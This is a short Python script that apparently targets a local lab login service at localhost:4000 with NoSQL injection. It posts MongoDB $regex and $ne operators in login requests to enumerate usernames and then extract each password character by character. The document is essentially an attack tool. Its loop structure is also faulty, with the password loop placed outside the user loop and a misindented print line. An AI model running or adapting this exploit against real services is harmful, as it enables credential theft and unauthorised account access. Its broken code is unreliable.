#!/usr/bin/python3

import requests, sys, signal, json, pdb, string

# CTRL + C

def ctrl_c(sig, fram):
    print("\n\n\t [!] Quiting....")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

#-----------------------------

#Variables globales
characters = string.ascii_letters + string.digits
main_url = "http://localhost:4000/user/login"
headers = {'Content-Type': 'application/json'}

def get_users():
   
    users = []

    #headers = {'Content-Type': 'application/json'}

    for first_character in characters:
        for second_character in characters:
            
            post_data = '{"username":{"$regex":"^%s%s"},"password":{"$ne":"dkjfha"}}' % (first_character, second_character)
            
            r = requests.post(main_url, data=post_data, headers=headers)

            if "Invalid username or password." not in r.text:
                #pdb.set_trace()
                response = json.loads(r.text)
                user = response['username']
                #print(f"[+] El usuario {user} es un usuario válido")
                users.append(user)

    return users


def getLengthPassword(user):

    for digit in range(1, 50):
        post_data = '{"username":"%s","password":{"$regex":".{%d}"}}' % (user, digit)

        r = requests.post(main_url, data=post_data, headers=headers)

        if "Invalid username or password." in r.text:
            password_length = digit - 1 
            return password_length
    

def getPasswords(users):
    
    for user in users:
        password = ""
        #print(f"[!] User {user}")
        passwordLength = getLengthPassword(user)
        #print(f"[*] El usuario tiene una password de {passwordLength} de longitud")

    for position in range(0, passwordLength):
        for character in characters:

            post_data = '{"username":"%s","password":{"$regex":"^%s%s"}}' % (user, password, character)

            r = requests.post(main_url, data=post_data, headers=headers)

            if "Invalid username or password." not in r.text:
                password += character
                break

       print("[!] La contraseña de %s es %s" % (user, password)) 


if __name__ == "__main__":
    
    users = get_users()
    getPasswords(users)
